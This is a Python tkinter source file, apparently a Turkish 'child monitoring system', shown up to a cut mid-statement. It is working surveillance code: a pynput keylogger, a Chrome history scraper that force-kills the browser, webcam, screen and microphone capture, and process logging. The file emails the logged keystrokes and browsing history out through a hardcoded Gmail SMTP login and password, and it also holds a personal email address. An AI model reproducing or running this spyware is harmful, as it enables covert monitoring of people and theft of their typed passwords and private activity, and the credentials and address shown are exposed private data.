
#<---Gerekli kütüphanelerin eklenmesi--->

from tkinter import *
import sqlite3
import re
import os
import getpass
import subprocess
from pynput.keyboard import Key,Listener
import autopy
import random
import threading
import time
import pyaudio
import wave
import locale
import glob
from datetime import datetime
from PIL import Image
import winsound
import cv2
import smtplib 
import webbrowser
from tkinter import messagebox


#</---Gerekli kütüphanelerin eklenmesi--->


#<---Global Değişkenlerin Tanımlanması--->

global deger
global bugun
global timebreak
global zamansabiti

timebreak=True

#</---Global Değişkenlerin Tanımlanması--->
def Settings():
    def buttonKaydet():
        dosya=open("Settings/ayarlar.txt", "w")
        dosya.write( sesText.get("1.0",'end-1c') )
        
        dosya.write( intText.get("1.0",'end-1c') )
        
        dosya.write( ekranText.get("1.0",'end-1c') )
        
        dosya.write( mailText.get("1.0",'end-1c') )
        
        dosya.write( webText.get("1.0",'end-1c') )
        
        dosya.write( keyText.get("1.0",'end-1c') )
        
        dosya.write( uygText.get("1.0",'end-1c') )
        
        dosya.close()
        dosyam=open("Settings/mail.txt", "w")
        dosyam.write( mailAdresText.get("1.0",'end-1c') )
        dosyam.close()
        messagebox.showinfo("Kayıt", "Ayarlarınız Kaydedilmiştir")
        form.destroy()

    form=Tk()
    form.title("Ayarlar")
    form.geometry('600x800')
    form.wm_iconbitmap('img/iconum.ico')
    form.configure(background='#050238')
    try:
        dosya=open("Settings/ayarlar.txt", "r")
        dizi=[]
        dizi=dosya.readlines()
        dosya.close()
        dosyam=open("Settings/mail.txt", "r")
        mailim=dosyam.read()
        dosyam.close()
    except:
        dizi=[]
        dizi[0]=10
        dizi[1]=10
        dizi[2]=10
        dizi[3]=10
        dizi[4]=10
        dizi[5]=10
        dizi[6]=10
        mailim="ugurilgin94@gmail.com"
        print("Burası")

    print(dizi[0])
    isimLabel=Label(form,text="Ayarlar",bg="#050238",fg="#ffffff")
    sesLabel=Label(form,text="Ses Kaydetme Süresi(sn) ",bg="#050238",fg="#ffffff")
    intLabel=Label(form,text="İnternet  Geçmişi  Süresi(sn) ",bg="#050238",fg="#ffffff")
    ekranLabel=Label(form,text="Ekran  Kaydetme Süresi(sn) ",bg="#050238",fg="#ffffff")
    mailLabel=Label(form,text="Mail Gönderme Süresi(sn) ",bg="#050238",fg="#ffffff")
    webLabel=Label(form,text="WebCam Kaydetme Süresi(sn) ",bg="#050238",fg="#ffffff")
    keyLabel=Label(form,text="Tuş Kaydetme Süresi(sn) ",bg="#050238",fg="#ffffff")
    uygLabel=Label(form,text="Uygulama İzleme Süresi(sn) ",bg="#050238",fg="#ffffff")
    mailAdresLabel=Label(form,text="Mail Adresiniz(sn) ",bg="#050238",fg="#ffffff")


    isimLabel.place(x=20,y=20)
    sesLabel.place(x=20,y=100)
    intLabel.place(x=20,y=140)
    ekranLabel.place(x=20,y=180)
    mailLabel.place(x=20,y=220)
    webLabel.place(x=20,y=260)
    keyLabel.place(x=20,y=300)
    uygLabel.place(x=20,y=340)
    mailAdresLabel.place(x=20,y=500)
    
    
    

    sesText=Text(form,width=18,height=1)
    intText=Text(form,width=18,height=1)
    ekranText=Text(form,width=18,height=1)
    mailText=Text(form,width=18,height=1)
    webText=Text(form,width=18,height=1)
    keyText=Text(form,width=18,height=1)
    uygText=Text(form,width=18,height=1)
    mailAdresText=Text(form,width=25,height=1)
    
    sesText.insert(INSERT,dizi[0])
    intText.insert(INSERT,dizi[1])
    ekranText.insert(INSERT,dizi[2])
    mailText.insert(INSERT,dizi[3])
    webText.insert(INSERT,dizi[4])
    keyText.insert(INSERT,dizi[5])
    uygText.insert(INSERT,dizi[6])
    mailAdresText.insert(INSERT,mailim)

    sesText.place(x=183,y=100)
    intText.place(x=183,y=140)
    ekranText.place(x=183,y=180)
    mailText.place(x=183,y=220)
    webText.place(x=183,y=260)
    keyText.place(x=183,y=300)
    uygText.place(x=183,y=340)
    mailAdresText.place(x=183,y=500)

    dosyaBut=Button(form,command=buttonKaydet,text="Kaydet",bg="#4e91d8",fg="#ffffff",width=8,height=2)
   
    
    dosyaBut.place(x=300,y=600)
    
    
    form.mainloop()
    
def mailSender():
    global bugun
    a=datetime.now()
    b=str(a)
    c=b.split('.')
    d=c[0].split(":")
    bugun=datetime.strftime(a,'%d %B %Y')
    try:
        webdosya=open("WebHistory/"+bugun+"/HistoryList.txt", "r")
        webstring=webdosya.read()
        webdosya.close()
    except:
        webstring="İnternet Geçmişi  Bulunamadı"
        
    try:
        uygdosya=open("Uygulama/"+bugun+"/"+"appsOpen.txt", "r")
        uygstring=uygdosya.read()
        uygdosya.close()
    except:
        uygstring="Uygulama Geçmişi Bulunamadı"
    try:
        keydosya=open("Keylogger/"+bugun+"/kaydedilenmetin.txt","r")
        keystring=keydosya.read()
        keydosya.close()
    except:
        keystring="Keylogger Geçmişi Bulunamadı"   
   
    adres="Mail/"+bugun+"/"+d[0]+"-"+d[1]+"-"+d[2]+"-"+"Mail.txt"   
    if not os.path.exists('Mail/'+bugun):
        os.makedirs('Mail/'+bugun)
        dosya=open(adres,"a",encoding='utf-8')
        dosya.write(bugun+"\n")
        dosya.write(webstring+"\n")
        dosya.write(uygstring+"\n")
        dosya.write(keystring+"\n")
        dosya.close()
        
    else:
        dosya=open(adres,"a",encoding='utf-8')
        dosya.write(bugun+"\n")
        dosya.write(webstring+"\n")
        dosya.write(uygstring+"\n")
        dosya.write(keystring+"\n")
        dosya.close()
        mailCreate(adres)
    
def mailCreate(adres):
    dosya=open(adres,"r",encoding='utf-8')
    icerik=dosya.read()
    dosya.close()
    mail=smtplib.SMTP("smtp.gmail.com",587)
    mail.ehlo()
    mail.starttls()
    mail.login("cocuktakippro@gmail.com","CocukTakip")
    try:
        dosyam=open("Settings/mail.txt", "r")
        mailim=dosyam.read()
        dosyam.close()
    except:
        mailim="ugurilgin94@gmail.com"
    mail.sendmail("cocuktakippro@gmail.com",mailim,icerik.encode("utf-8"))

def mailListBaslangic():
    a=datetime.now()
    b=str(a)
    c=b.split('.')
    d=c[0].split(":")
    bugun=datetime.strftime(a,'%d %B %Y')
    mailList(bugun)  
    


def mailList(tarih):

    form=Tk()
    form.title("Gönderilmiş Mailler")
    form.geometry('800x800')
    form.configure(background='#050238')
    form.wm_iconbitmap('img/iconum.ico')
    dosyaLabel=Label(form,text="Dosyalar",bg="#050238",fg="#f2eaea")
    dosyalarL=Listbox(form,height=37,width=40,bg="#ffffff",fg="#000000",highlightthickness=0)
    klasorLabel=Label(form,text="Klasörler",bg="#050238",fg="#f2eaea")
    klasorlerL=Listbox(form,height=37,width=40,bg="#ffffff",fg="#000000",highlightthickness=0)
    dosyaLabel.place(x=80,y=50)
    klasorLabel.place(x=520,y=50)
    klasorlerL.place(x=520,y=100)
    dosyalarL.place(x=80,y=100)
    (klasorler,dosyalar) = ayristir("Mail//")
    try:
        (Bklasorler,Bdosyalar) = ayristir("Mail//"+tarih+"//")
    except:
        os.makedirs('Mail/'+tarih)
        (Bklasorler,Bdosyalar) = ayristir("Mail//"+tarih+"//")
    for row in klasorler:
        klasorlerL.insert("end", row) 

    for item in Bdosyalar:
        dosyalarL.insert("end", item) 
        
    
    klasorlerL.bind("<Double-Button-1>",mailklasorAcOnDouble)
    dosyalarL.bind("<Double-Button-1>",mailAcOnDouble)
    form.mainloop()


def mailklasorAcOnDouble(event):
    
    global bugun
    widget = event.widget
    selection=widget.curselection()
    value = widget.get(selection[0])
    bugun=value
    
    mailList(value)

def mailAcOnDouble(event):
    global bugun
    widget = event.widget
    selection=widget.curselection()
    value = widget.get(selection[0])
    webbrowser.open(os.getcwd() + "/Mail/"+bugun+"/"+value)

    




#<---WebCamden Görüntü Kaydetme--->
def webCamSaver():
    global bugun
    a=datetime.now()
    b=str(a)
    c=b.split('.')
    d=c[0].split(":")
    bugun=datetime.strftime(a,'%d %B %Y')
    if not os.path.exists('WebCam/'+bugun):
        os.makedirs('WebCam/'+bugun)
    video = cv2.VideoCapture(0) 
    check, frame = video.read()
    showPic = cv2.imwrite('WebCam/'+bugun+'/'+d[0]+d[1]+d[2]+'.jpg',frame)
    video.release()
    cv2.destroyAllWindows
#</---WebCamden Görüntü Kaydetme--->

#<---WebCamden Kaydedilen Görüntüleri  Görme--->
def webCamBaslangic():
    global bugun
    webCamViewer(bugun)  


def webCamViewer(tarih):
    
    form=Tk()
   
    form.title("Kaydedilmiş WebCam Görüntüleri")
    form.geometry('800x800')
    form.wm_iconbitmap('img/iconum.ico')
    form.configure(background='#050238')
    dosyaLabel=Label(form,text="Dosyalar",bg="#050238",fg="#f2eaea")
    dosyalarL=Listbox(form,height=37,width=40,bg="#ffffff",fg="#000000",highlightthickness=0)
    klasorLabel=Label(form,text="Klasörler",bg="#050238",fg="#f2eaea")
    klasorlerL=Listbox(form,height=37,width=40,bg="#ffffff",fg="#000000",highlightthickness=0)
    dosyaLabel.place(x=80,y=50)
    klasorLabel.place(x=520,y=50)
    klasorlerL.place(x=520,y=100)
    dosyalarL.place(x=80,y=100)
    (klasorler,dosyalar) = ayristir("WebCam//")
    try:
        (Bklasorler,Bdosyalar) = ayristir("WebCam//"+tarih+"//")
    except:
        os.makedirs('WebCam/'+tarih)
        (Bklasorler,Bdosyalar) = ayristir("WebCam//"+tarih+"//")

    for row in klasorler:
        klasorlerL.insert("end", row) 

    for item in Bdosyalar:
        dosyalarL.insert("end", item) 
    klasorlerL.bind("<Double-Button-1>",webCamKlasorAcOnDouble)
    dosyalarL.bind("<Double-Button-1>",webCamResimAcOnDouble)
   

    form.mainloop() 
    

    

def webCamKlasorAcOnDouble(event):
    
    global bugun
    widget = event.widget
    selection=widget.curselection()
    value = widget.get(selection[0])
    bugun=value
    
    webCamViewer(value)


def webCamResimAcOnDouble(event):

    global bugun
    widget = event.widget
    selection=widget.curselection()
    value = widget.get(selection[0])
    img=Image.open("WebCam/"+bugun+"/"+value)
    img.show()



#</---WebCamden Kaydedilen Görüntüleri  Görme--->



#</---İnternet Geçmişi Kaydetme Fonksiyonunun Tanımlanması--->
def baslangicHistory():
    global bugun
    a=datetime.now()
    bugun=datetime.strftime(a,'%d %B %Y')
    if not os.path.exists('WebHistory/'+bugun+'/WebHistory.txt'):
        try:
            conn = sqlite3.connect('c://Users//'+getpass.getuser()+'//AppData//Local//Google//Chrome//User Data//Default//History',timeout=10)
            c = conn.cursor()
            c.execute("SELECT * FROM urls")
            rows = c.fetchall()
        
            dosya=open("WebHistory/"+bugun+"/WebHistory.txt","w",encoding='utf-8')
            for row in rows:
                dosya.write(row[2]+"\n")
                conn.commit()        
            dosya.close()
            conn.close()
            
        except:
            os.system("TASKKILL /F /IM chrome.exe") 
            time.sleep(1)  
            conn = sqlite3.connect('c://Users//'+getpass.getuser()+'//AppData//Local//Google//Chrome//User Data//Default//History',timeout=10)
            c = conn.cursor()
            c.execute("SELECT * FROM urls")
            rows = c.fetchall()
            if not os.path.exists('WebHistory/'+bugun):
                os.makedirs('WebHistory/'+bugun)
            dosya=open("WebHistory/"+bugun+"/WebHistory.txt","w",encoding='utf-8')
            for row in rows:
                dosya.write(row[2]+"\n")
                conn.commit()        
            dosya.close()
            conn.close()     
  

def bulHistory():

    try:
        a=datetime.now()
        bugun=datetime.strftime(a,'%d %B %Y')
        if not os.path.exists('WebHistory/'+bugun):
            os.makedirs('WebHistory/'+bugun)
        conn = sqlite3.connect('c://Users//'+getpass.getuser()+'//AppData//Local//Google//Chrome//User Data//Default//History',timeout=10)
        c = conn.cursor()
        c.execute("SELECT * FROM urls")
        rows = c.fetchall()
        dosya=open("WebHistory/"+bugun+"/YeniWebHistory.txt","w",encoding='utf-8')
        for row in rows:
            dosya.write(row[2]+"\n")
            conn.commit()        
        dosya.close()
        conn.close()
        dosya=open("WebHistory/"+bugun+"/WebHistory.txt","r",encoding='utf-8')
        dizi=[]
        dizi=dosya.readlines()
        dosya.close()
        idosya=open("WebHistory/"+bugun+"/YeniWebHistory.txt","r",encoding='utf-8')
        dizim=[]
        dizim=idosya.readlines()
        idosya.close()
        yenidizi=[]
        for j in dizim:
            if( j not in dizi):
                yenidizi.append(j+"\n")
        a=datetime.now()
        bugun=datetime.strftime(a,'%d %B %Y')
        if not os.path.exists('WebHistory/'+bugun):
            os.makedirs('WebHistory/'+bugun)
        for i in yenidizi:
            dosya=open("WebHistory/"+bugun+"/HistoryList.txt", "a")
            dosya.write(i)
            dosya.close()  
            
    except:
        a=datetime.now()
        bugun=datetime.strftime(a,'%d %B %Y')
        if not os.path.exists('WebHistory/'+bugun):
            os.makedirs('WebHistory/'+bugun)
        os.system("TASKKILL /F /IM chrome.exe")
        time.sleep(1)
        c = conn.cursor()
        c.execute("SELECT * FROM urls")
        rows = c.fetchall()
        dosya=open("WebHistory/"+bugun+"/YeniWebHistory.txt","w",encoding='utf-8')
        for row in rows:
            dosya.write(row[2]+"\n")
            conn.commit()        
        dosya.close()
        conn.close()
        dosya=open("WebHistory/"+bugun+"/WebHistory.txt","r",encoding='utf-8')
        dizi=[]
        dizi=dosya.readlines()
        dosya.close()
        idosya=open("WebHistory/"+bugun+"/YeniWebHistory.txt","r",encoding='utf-8')
        dizim=[]
        dizim=idosya.readlines()
        idosya.close()
        yenidizi=[]
        for j in dizim:
            if( j not in dizi):
                yenidizi.append(j+"\n")
        a=datetime.now()
        bugun=datetime.strftime(a,'%d %B %Y')
        if not os.path.exists('WebHistory/'+bugun):
            os.makedirs('WebHistory/'+bugun)
        for i in yenidizi:
            dosya=open("WebHistory/"+bugun+"/HistoryList.txt", "a")
            dosya.write(i)
            dosya.close()  

def baslabrowserHistory():
    global bugun
    browserHistory(bugun) 


def browserHistory(tarih):

    form=Tk()
    form.title("Kaydedilmiş İnternet Geçmişi")
    form.geometry('1920x800')
    form.configure(background='#050238')
    form.wm_iconbitmap('img/iconum.ico')
    liste=Listbox(form,height=37,width=80,bg="#ffffff",fg="#000000",bd=0,highlightthickness=0)
    liste.place(x=60,y=100)
    a=datetime.now()
    bugun=datetime.strftime(a,'%d %B %Y')

    try:
        dosya=open("WebHistory/"+tarih+"/HistoryList.txt", "r")
        dizi=[]
        dizi=dosya.readlines()
        
    except:
        dizi=[tarih,"ait Kayıt Bulunamadı"]
    
    
    textLabel=Label(form,text="İnternet Geçmişi",bg="#050238",fg="#f2eaea")
    
    textLabel.place(x=80,y=50)
    
    dosyaLabel=Label(form,text="Dosyalar",bg="#050238",fg="#f2eaea")
    dosyalarL=Listbox(form,height=37,width=40,bg="#ffffff",fg="#000000",highlightthickness=0)
    klasorLabel=Label(form,text="Klasörler",bg="#050238",fg="#f2eaea")
    klasorlerL=Listbox(form,height=37,width=40,bg="#ffffff",fg="#000000",highlightthickness=0)
    dosyaLabel.place(x=620,y=50)
    klasorLabel.place(x=980,y=50)
    klasorlerL.place(x=980,y=100)
    dosyalarL.place(x=620,y=100)
    (klasorler,dosyalar) = ayristir("WebHistory//")
    for row in klasorler:
        klasorlerL.insert("end", row)
   
    dosyalarL.insert("end", "historyList.txt") 
   
    klasorlerL.bind("<Double-Button-1>",hisklasorAcOnDouble)
    
    dosya.close()


    
    for row in dizi:
        liste.insert("end", row)       
    form.mainloop()

   
def hisklasorAcOnDouble(event):
    
    global bugun
    widget = event.widget
    selection=widget.curselection()
    value = widget.get(selection[0])
    bugun=value
    
    browserHistory(value)  

def ayristir(path):

    dirList=os.listdir(path)
    dirList.sort()

    fnames = []
    dnames = []

    for fname in dirList:
        if os.path.isdir(path + fname):
            dnames.append(fname)
        
        if os.path.isfile(path + fname):
           fnames.append(fname)

    return dnames,fnames 
############################################################################################## 

#<---Ses Kaydetme Fonksiyonunun Tanımlanması--->


def recordAudio():
    try:
        dosya=open("Settings/ayarlar.txt", "r")
        dizi=[]
        dizi=dosya.readlines()
        dosya.close()
        dosyam=open("Settings/mail.txt", "r")
        mailim=dosyam.read()
        dosyam.close()
    except:
        dizi=[]
        dizi[0]=10
        dizi[1]=10
        dizi[2]=10
        dizi[3]=10
        dizi[4]=10
        dizi[5]=10
        dizi[6]=10
        mailim="ugurilgin94@gmail.com"
        print("Burası")
    global zamansabiti
    FORMAT = pyaudio.paInt16
    CHANNELS = 2
    RATE = 44100
    CHUNK = 1024
    RECORD_SECONDS = int(dizi[0])+1
    a=datetime.now()
    b=str(a)
    c=b.split('.')
    d=c[0].split(":")
    bugun=datetime.strftime(a,'%d %B %Y')
    if not os.path.exists('Audio/'+bugun):
        os.makedirs('Audio/'+bugun)
    WAVE_OUTPUT_FILENAME = "Audio/"+bugun+"/"+d[0]+d[1]+d[2]+".wav"
    print(a)
    audio = pyaudio.PyAudio()
 
# start Recording
    stream = audio.open(format=FORMAT, channels=CHANNELS,rate=RATE, input=True,frames_per_buffer=CHUNK)
    print ("recording...")
    frames = []
 
    for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
        data = stream.read(CHUNK)
        frames.append(data)
    print ("finished recording")
 
 
# stop Recording
    stream.stop_stream()
    stream.close()
    audio.terminate()
 
    waveFile = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
    waveFile.setnchannels(CHANNELS)
    waveFile.setsampwidth(audio.get_sample_size(FORMAT))
    waveFile.setframerate(RATE)
    waveFile.writeframes(b''.join(frames))
    waveFile.close()

#</---Ses Kaydetme Fonksiyonunun Tanımlanması--->

#<---Kaydedilen Sesler Fonksiyonunun Tanımlanması--->

def soundListenerBaslangic():
    global bugun
    soundListener(bugun) 


def soundListener(tarih):
    
    
    form=Tk()
    
    form.title("Kaydedilmiş Sesler")
    form.geometry('800x800')
    form.wm_iconbitmap('img/iconum.ico')
    form.configure(background='#050238')
    dosyaLabel=Label(form,text="Dosyalar",bg="#050238",fg="#f2eaea")
    dosyalarL=Listbox(form,height=37,width=40,bg="#ffffff",fg="#000000",highlightthickness=0)
    klasorLabel=Label(form,text="Klasörler",bg="#050238",fg="#f2eaea")
    klasorlerL=Listbox(form,height=37,width=40,bg="#ffffff",fg="#000000",highlightthickness=0)
    dosyaLabel.place(x=80,y=50)
    klasorLabel.place(x=520,y=50)
    klasorlerL.place(x=520,y=100)
    dosyalarL.place(x=80,y=100)
    (klasorler,dosyalar) = ayristir("Audio//")
    (Bklasorler,Bdosyalar) = ayristir("Audio//"+tarih+"//")

    for row in klasorler:
        klasorlerL.insert("end", row) 

    for item in Bdosyalar:
        dosyalarL.insert("end", item) 
    klasorlerL.bind("<Double-Button-1>",sesklasorAcOnDouble)
    dosyalarL.bind("<Double-Button-1>",sesAcOnDouble)
   

    form.mainloop() 
    

    

def sesklasorAcOnDouble(event):
    
    global bugun
    widget = event.widget
    selection=widget.curselection()
    value = widget.get(selection[0])
    bugun=value
    
    soundListener(value)


def sesAcOnDouble(event):

    global bugun
    widget = event.widget
    selection=widget.curselection()
    value = widget.get(selection[0])
    winsound.PlaySound("Audio/"+bugun+"/"+value,winsound.SND_ASYNC)
    
    
#</---Kaydedilen Sesler Fonksiyonunun Tanımlanması--->

#<---Ekran  Kaydededici Fonksiyonunun Tanımlanması--->

def screenSaver():

    a=datetime.now()
    b=str(a)
    c=b.split('.')
    d=c[0].split(":")
    bugun=datetime.strftime(a,'%d %B %Y')
    if not os.path.exists('Screen/'+bugun):
        os.makedirs('Screen/'+bugun)
    a=random.randint(1,1000000000000000000000000)
    bitmap=autopy.bitmap.capture_screen()
    bitmap.save('Screen/'+bugun+'/'+d[0]+d[1]+d[2]+'.png')

#</---Ekran  Kaydededici Fonksiyonunun Tanımlanması--->

#<---Kaydedilmiş Resimlerin Görüntülenmesi Fonksiyonunun Tanımlanması--->


def imageViewerBaslangic():
    global bugun
    imageViewer(bugun)  


def imageViewer(tarih):
    
    
    form=Tk()
   
    form.title("Kaydedilmiş Ekran Görüntüleri")
    form.geometry('800x800')
    form.wm_iconbitmap('img/iconum.ico')
    form.configure(background='#050238')
    dosyaLabel=Label(form,text="Dosyalar",bg="#050238",fg="#f2eaea")
    dosyalarL=Listbox(form,height=37,width=40,bg="#ffffff",fg="#000000",highlightthickness=0)
    klasorLabel=Label(form,text="Klasörler",bg="#050238",fg="#f2eaea")
    klasorlerL=Listbox(form,height=37,width=40,bg="#ffffff",fg="#000000",highlightthickness=0)
    dosyaLabel.place(x=80,y=50)
    klasorLabel.place(x=520,y=50)
    klasorlerL.place(x=520,y=100)
    dosyalarL.place(x=80,y=100)
    (klasorler,dosyalar) = ayristir("Screen//")
    (Bklasorler,Bdosyalar) = ayristir("Screen//"+tarih+"//")

    for row in klasorler:
        klasorlerL.insert("end", row) 

    for item in Bdosyalar:
        dosyalarL.insert("end", item) 
    klasorlerL.bind("<Double-Button-1>",klasorAcOnDouble)
    dosyalarL.bind("<Double-Button-1>",resimAcOnDouble)
   

    form.mainloop() 
    

    

def klasorAcOnDouble(event):
    
    global bugun
    widget = event.widget
    selection=widget.curselection()
    value = widget.get(selection[0])
    bugun=value
    
    imageViewer(value)


def resimAcOnDouble(event):

    global bugun
    widget = event.widget
    selection=widget.curselection()
    value = widget.get(selection[0])
    img=Image.open("Screen/"+bugun+"/"+value)
    img.show()



#</---Kaydedilmiş Resimlerin Görüntülenmesi Fonksiyonunun Tanımlanması--->

#<---Uygulama İzleme Fonksiyonunun Tanımlanması--->

def uygBul():
    
    x = subprocess.Popen("tasklist", stdout=subprocess.PIPE, shell=True)
    output =x.stdout.read()
    dosyam=open("Uygulama/appslar.txt", "w")
    a=output
    dosyam.write(a.decode('utf-8'))
    dosyam.close()
    dosya=open("Uygulama/apps.txt", "r")
    dizi=[]
    dizi=dosya.readlines()
    dosya.close()
    ikinci=open("Uygulama/appslar.txt", "r")
    dizim=[]
    dizim=ikinci.readlines()
    ikinci.close()
    gecicidizi=[]
    for i in dizim:
        a=i.split(".")
    
        gecicidizi.append(a[0])
    yenigecicidizi=[]
    for i in dizi:
        a=i.split(".")
        yenigecicidizi.append(a[0])
        
    yenidizi=[]
    
    for j in gecicidizi :
        if( j not in yenigecicidizi):
            yenidizi.append(j+"\n")
   
   
    a=datetime.now()
    bugun=datetime.strftime(a,'%d %B %Y')
    if not os.path.exists('Uygulama/'+bugun):
        os.makedirs('Uygulama/'+bugun)
    for i in yenidizi:
        if(("chrome" in i) or ("opera" in i) or ("yandex" in i)  or ("safari" in i)  or ("explorer" in i) or ("firefox" in i) or ("tor" in i)  or ("browser" in i)  ):
            dosya=open("Uygulama/"+bugun+"/appsOpen.txt", "a")
            dosya.write(i+ " Browser açıldı İnternet Historye Bakınız \n")
            dosya.close()
        elif(("System" in i) or ("Registry" in i)or("Memory Compression" in i) ):
            print(i)   
        else:
           
            dosya=open("Uygulama/"+bugun+"/appsOpen.txt", "a")
            dosya.write(i)
            dosya.close()
 


    
    
def baslangicUyg():

    x = subprocess.Popen("tasklist", stdout=subprocess.PIPE, shell=True)
    output =x.stdout.read()
    dosya=open("Uygulama/apps.txt", "w")
    a=output
    dosya.write(a.decode('utf-8'))
    dosya.close()


def taskListBaslangic():
    global bugun
    taskList(bugun)   


def taskList(tarih):
    try:
        dosya=open("Uygulama/"+bugun+"/appsOpen.txt","r")
    except:
        dosya=open("Uygulama/"+bugun+"/appsOpen.txt","w")
        dosya.write(" ")
        
    form=Tk()
    form.wm_iconbitmap('img/iconum.ico')

    form.title("Uygulamaları İzle")
    form.geometry('1920x800')
    form.configure(background='#050238')
    textLabel=Label(form,text="Uygulamalarım",bg="#050238",fg="#f2eaea")
    textBox=Text(form,bg="#ffffff",fg="#000000",height=37,width=50)
    textLabel.place(x=80,y=50)
    textBox.place(x=60,y=100)
    dosyaLabel=Label(form,text="Dosyalar",bg="#050238",fg="#f2eaea")
    dosyalarL=Listbox(form,height=37,width=40,bg="#ffffff",fg="#000000",highlightthickness=0)
    klasorLabel=Label(form,text="Klasörler",bg="#050238",fg="#f2eaea")
    klasorlerL=Listbox(form,height=37,width=40,bg="#ffffff",fg="#000000",highlightthickness=0)
    dosyaLabel.place(x=520,y=50)
    klasorLabel.place(x=980,y=50)
    klasorlerL.place(x=980,y=100)
    dosyalarL.place(x=520,y=100)
    (klasorler,dosyalar) = ayristir("Uygulama//")
    (Bklasorler,Bdosyalar) = ayristir("Uygulama//"+tarih+"//")

    for row in klasorler:
        klasorlerL.insert("end", row) 

    for item in Bdosyalar:
        dosyalarL.insert("end", item) 
    klasorlerL.bind("<Double-Button-1>",uygklasorAcOnDouble)
    textBox.insert("end",tarih+"\n")
    textBox.insert("end",dosya.read())
    dosya.close()
    form.mainloop()


def uygklasorAcOnDouble(event):
    
    global bugun
    widget = event.widget
    selection=widget.curselection()
    value = widget.get(selection[0])
    bugun=value
    
    taskList(value)



#</---Uygulama İzleme Fonksiyonunun Tanımlanması--->

#<---Keylogger Fonksiyonunun Tanımlanması--->

def baslangicKeylooger():
    global bugun
    Keylogger(bugun)

def Keyloggerim():

    global deger
    deger=True
    def on_press(key):
        a=datetime.now()
        bugun=datetime.strftime(a,'%d %B %Y')
        if not os.path.exists('Keylogger/'+bugun):
            os.makedirs('Keylogger/'+bugun)
        print(key)
        dosya=open("Keylogger/"+bugun+"/"+"kaydedilenmetin.txt","a")
        if(key==Key.space):
            dosya.write(" ")
        elif(key==Key.enter):
            dosya.write("\n")
        elif(key==Key.shift):
            dosya.write("<Shif>")
        elif(key==Key.caps_lock):
            dosya.write("<CapsLock>")
        elif(key==Key.backspace):
            dosya.write("<delete>")
        elif(key==Key.tab):
            dosya.write("\t")
        elif(key==Key.ctrl):
            dosya.write(" Ctrl+")
        elif(key==Key.ctrl_l):
            dosya.write(" Ctrl+")
        else:
            a=str(key).split("'")
            try:
                dosya.write(a[1])
            except:
                dosya.write(str(key))
        dosya.close
    def on_release(key):
       
        dosya=open("online.txt","r")
        a=dosya.read()
        dosya.close()

        if(a=="0"):
            return False
        elif(key==Key.end):
            return False
            
        
    
    with Listener(on_press=on_press,on_release=on_release) as listener:
        listener.join()


def Keylogger(tarih):

    dosya=open("online.txt","w")
    dosya.write("1")
    dosya.close()
    try:
        dosya=open("Keylogger/"+bugun+"/kaydedilenmetin.txt","r")
    except:
        dosya=open("Keylogger/"+bugun+"/kaydedilenmetin.txt","w")
        dosya.write(" ")
    form=Tk()
    form.wm_iconbitmap('img/iconum.ico')

    form.title("Kaydedilmiş Tuşlar")
    form.geometry('1920x800')
    form.configure(background='#050238')
    textLabel=Label(form,text="Kaydedilen Metin",bg="#050238",fg="#f2eaea")
    textBox=Text(form,bg="#ffffff",fg="#000000",height=37,width=50)
    textLabel.place(x=80,y=50)
    textBox.place(x=60,y=100)
    dosyaLabel=Label(form,text="Dosyalar",bg="#050238",fg="#f2eaea")
    dosyalarL=Listbox(form,height=37,width=40,bg="#ffffff",fg="#000000",highlightthickness=0)
    klasorLabel=Label(form,text="Klasörler",bg="#050238",fg="#f2eaea")
    klasorlerL=Listbox(form,height=37,width=40,bg="#ffffff",fg="#000000",highlightthickness=0)
    dosyaLabel.place(x=520,y=50)
    klasorLabel.place(x=980,y=50)
    klasorlerL.place(x=980,y=100)
    dosyalarL.place(x=520,y=100)
    (klasorler,dosyalar) = ayristir("Keylogger//")
    (Bklasorler,Bdosyalar) = ayristir("Keylogger//"+tarih+"//")

    for row in klasorler:
        klasorlerL.insert("end", row) 

    for item in Bdosyalar:
        dosyalarL.insert("end", item) 
    klasorlerL.bind("<Double-Button-1>",keyklasorAcOnDouble)
    textBox.insert("end",tarih+"\n")
    textBox.insert("end",dosya.read())
    dosya.close()
    form.mainloop()


def keyklasorAcOnDouble(event):
    
    global bugun
    widget = event.widget
    selection=widget.curselection()
    value = widget.get(selection[0])
    bugun=value
    
    Keylogger(value)



#</---Keylogger Fonksiyonunun Tanımlanması--->

#<---İzleyici Başlat Fonksiyonunun Tanımlanması--->

def izleyiciBaslat():
    global timebreak
    timebreak=True
    dosya=open("online.txt","w")
    dosya.write("1")
    dosya.close()
    sesKaydediciThread.start()
    baslangicUygThread.start()
    baslangicHistoryThread.start()
    zamanlayiciThread.start()
    keyloggerThread.start()
#</---İzleyici Başlat Fonksiyonunun Tanımlanması--->

#<---Anamenü Fonksiyonunun Tanımlanması--->

def AnaMenu():
    
    global bugun
    
    window = Tk()
    window.wm_iconbitmap('img/iconum.ico')

    w, h = window.winfo_screenwidth(), window.winfo_screenheight()
    window.geometry("%dx%d+0+0" % (w, h))
    window.title("Çocuk Takip Sistemi")
    window.configure(background='#050238')
    def stopTheWorld():

        global timebreak
        timebreak=False
        dosya=open("online.txt","w")
        dosya.write("0")
        dosya.close()
        window.destroy()
        time.sleep(1)
        os._exit(0)
    foto=PhotoImage(file="img/web.png")
    webcam=PhotoImage(file="img/webcam.png")
    screen=PhotoImage(file="img/screen.png")
    key=PhotoImage(file="img/key.png")
    setting=PhotoImage(file="img/setting.png")
    mail=PhotoImage(file="img/mail.png")
    uyg=PhotoImage(file="img/uyg.png")
    ses=PhotoImage(file="img/ses.png")
    avatar=PhotoImage(file="img/avatar.png")
    play=PhotoImage(file="img/play.png")
    stop=PhotoImage(file="img/stopper.png")
    logo=PhotoImage(file="img/iconum.png")
    
    a=datetime.now()
    bugun=datetime.strftime(a,'%d %B %Y')

    sitebut=Button(window,text="Ziyaret Edilen Websiteleri",image=foto,bd=0,highlightthickness=0,command=baslabrowserHistory,width=169,height=162,bg="#F4192B",fg="#000000")
    sitebut.place(x=80,y=80)

    Webcam=Button(window,text="WebCam Kaydedici",command=webCamBaslangic,image=webcam,bd=0,highlightthickness=0,width=169,height=162,bg="#002fa7",fg="#000000")
    Webcam.place(x=300,y=80)

    ekranBut=Button(window,text="Ekran Kaydedici",image=screen,bd=0,highlightthickness=0,command=imageViewerBaslangic,width=168,height=162,bg="#ff7f00",fg="#000000")
    ekranBut.place(x=520,y=80)

    keyloggerBut=Button(window,text="Keylogger",image=key,bd=0,highlightthickness=0,command=baslangicKeylooger,width=168,height=162,bg="#00FF00",fg="#000000")
